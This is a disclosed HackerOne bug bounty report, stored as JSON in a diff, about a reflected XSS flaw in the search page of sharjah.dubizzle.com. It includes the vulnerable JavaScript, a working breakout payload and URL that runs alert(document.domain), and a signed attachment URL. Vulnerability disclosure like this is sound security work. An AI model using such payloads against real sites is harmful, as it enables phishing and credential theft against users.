@@ -1,0 +1,125 @@
+{
+  "id": 363571,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM1NzE=",
+  "url": "https://hackerone.com/reports/363571",
+  "title": "Search Page Reflected XSS on sharjah.dubizzle.com through unencoded output of GET parameter in JavaScript",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-06-08T20:16:29.471Z",
+  "submitted_at": "2018-06-08T20:16:29.471Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pajoda",
+    "url": "/pajoda",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/270/820/e06d2eeae865f4d3429bffc91c531b07c36b9e15_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8146,
+    "url": "https://hackerone.com/olx",
+    "handle": "olx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "OLX",
+      "twitter_handle": "OLX",
+      "website": "http://olx.com",
+      "about": "OLX is an online classifieds platform that enables its users to create ads and display them on social networks."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-12-16T11:18:03.766Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-11-16T11:17:59.648Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI found a reflected XSS vulnerability on the search page of sharjah.dubizzle.com.\nBecause the GET parameter `keywords` is not being encoded before parsing it into the JavaScript, an attacker can break out of the code an execute JavaScript in the targets browser.\n\n### Vulnerable Code\n\nWhen searching for `testtestfirsthackeronereport` (https://sharjah.dubizzle.com/search/?keywords=testtestfirsthackeronereport&is_basic_search_widget=1&is_search=1), the source of the page will look like the following:\n\n```\nvar pageOptions = {\n\t\"query\": \"testtestfirsthackeronereport Sharjah\",\n\t\"pubId\": \"partner-dubizzle-search\",\n\t\"adPage\": \"1\",\n\t\"location\": false,\n\t\"hl\": \"en \",\n\t\"channel\": \"search\",\n\t\"number\": 4,\n\t\"sellerRatings\": false,\n\t\"linkTarget\": \"_blank\",\n        \n\t\"adsafe\": \"medium\"\n};\n```\n\nAltering the search term to `test\"` will result in the following output in the source of the page:\n\n```\nvar pageOptions = {\n\t\"query\": \"test\" Sharjah\",\n\t\"pubId\": \"partner-dubizzle-search\",\n\t\"adPage\": \"1\",\n\t\"location\": false,\n\t\"hl\": \"en \",\n\t\"channel\": \"search\",\n\t\"number\": 4,\n\t\"sellerRatings\": false,\n\t\"linkTarget\": \"_blank\",\n        \n\t\"adsafe\": \"medium\"\n};\n```\n\nI decided to close the variable definiton, execute my code, and readd the exact same code, which has been executed before, again after running my code, so there won't be any JavaScript errors and the payload will be executed.\n\n### PoC\n\nThe final payload is: `fghgfhgfh\"}%3Balert('XSS Paul Dannewitz '%2Bdocument.domain)%3B var pageOptions %3D {\"query\"%3A \"`\nURL: https://sharjah.dubizzle.com/search/?keywords=fghgfhgfh\"}%3Balert('XSS%20Paul%20Dannewitz%20'%2Bdocument.domain)%3B%20var%20pageOptions%20%3D%20{\"query\"%3A%20\"&is_basic_search_widget=1&is_search=1\n\n{F306774}\n\nThe PoC will be parsed to:\n\n```\nvar pageOptions = {\n\t\"query\": \"fghgfhgfh\"};alert('XSS Paul Dannewitz'+document.domain); var pageOptions = {\"query\": \" Sharjah\",\n\t\"pubId\": \"partner-dubizzle-search\",\n\t\"adPage\": \"1\",\n\t\"location\": false,\n\t\"hl\": \"en \",\n\t\"channel\": \"search\",\n\t\"number\": 4,\n\t\"sellerRatings\": false,\n\t\"linkTarget\": \"_blank\",\n        \n\t\"adsafe\": \"medium\"\n};\n```\n\n## Impact\n\nThe most simple thing an attacker could do is sending a malicious link to a dubizzle user, whichs redirects the user/victim to the attackers page - which is a dubizzle phishing site - via JavaScript and steal the login credentials. There are probably more creative ways of using the ability to run JavaScript in the victims browser on dubizzle.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 306774,
+      "file_name": "1.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/306/774/9ad62a70c800b98a29023177d773e49f11615e0a/1.PNG?response-content-disposition=attachment%3B%20filename%3D%221.PNG%22%3B%20filename%2A%3DUTF-8%27%271.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVWHFSNNE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130552Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZLzSSHKxWIGhQtGT81DYUaazxK%2BA4b%2BeBse1XlfNIBwIgfPS8dRNp%2FxmFBCNrWLDxkracRrBYrm5cEg%2BjJDXIvNsqsgUIdRADGgwwMTM2MTkyNzQ4NDkiDNaBwIyE1dVL1zGF0iqPBeiofcLE831cuz%2Fg3%2FBj%2BOAUaL0qSPB0iFluwPLKGuVB6sGEff4eb%2BhiIZV7BGnszG7nUhp9GzIuA1YXeX1txWBdpF9oemEmi5NywysgHkWri0j4Huf8Kqc0veGGY9SjOhiXwycQ8YsHi0vPSebpPPXh0TfZnOU4brttYbmYDQt11ba4sYpdhFcGj2JT98cBsee%2Fc5T7bN4P2XDVhPiRuRw9aGFMqvz1hVd7umv69rNFED1JWINyJdd5C%2F6agSSB8sgbH71ksUBWB6gZbJY81x4rscmVfXXofwqa8PBk5Og2PopEsHO5gC2m6ONQs7oHx%2FwcPVQk3JG%2BUI5vzVw25Vs4%2BdZdhcmlVKrn%2B%2FAnPLwb1UVjUdIZ1Bh2A7dxoauy7mugTmVoaADIScHYKRRYQ6ymOT%2B5HZKcppxrXZOnvSp0bLZxAWUdNfX%2BptG8LPBB0HFsGwGHJM3e67F2eH8OPbwOv4CEGzSDxBRn5jAtojFIeM0zYT71ER7JqwYdvVMhHEmS6yzxVkocSBRdqjcwtHkc%2F3o0qHipZYK%2FYAM9qv8hFeWan6Sa185DBwXF3TgIsvbA%2Fcjp8pWqNUeqtz6soCDoRJUku0qJamW5nH6N7sH%2BtO5tJv6FlKTWPWglmSjgtpptDiSnxBFAQX9CJ8spiVo69mOdSoiBjJLiBs9VWBWsOKdxglim0NnAzaWeTydCoRC1TZO3P1tZhKm4UqA86wCtToWZwff54BVenmfxX29vKT622UzSbI49YSFrYIcmrAYj0mP7dMKGXpl0tZCD4BdH226Uje%2FjlE7N5BpXxeyGKIWjtnsKMm2g%2BMxP7x2yGOeguUUjYzkWYTTS1FwwtYRKn3lLwjDgiYO0bzSZF0Ew1bitrgY6sQHIue94FUiYiMOMkDJ9Ayf9fPYms2aIIAO2H9bXmuaR5lH9obA9b%2FPrvjiRxAZ6lxqcr%2B9QPKlzkknLInDxqbq5txCl1Rij1JaLqv%2B4UxnGRb8ZIpj0ICFXmBBF2kEefQwHF5kj7QtGSa2JcGxgdtN3u7o%2BaXyb07mhLfzaH6hd1QUtvhvVRlbD%2FIk%2F25jmafq1vwS1a1GzXy59j%2BKSs8AfLJwUQzk9Ye%2BpIrlwwlAnAww%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e90f2f54ed05309582334e9c9f6e17339a005a37b0e8bbeedbc7a4e5c6a20f69",
+      "file_size": 195917,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-12-16T11:17:59.760Z",
+  "allow_singular_disclosure_after": -162870472.7945032,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "n1m0",
+    "sameerphad72",
+    "th0roid",
+    "savitar0x01",
+    "khizer47",
+    "cryptographer",
+    "1a2er3d",
+    "abartan",
+    "0619",
+    "ronb1996",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
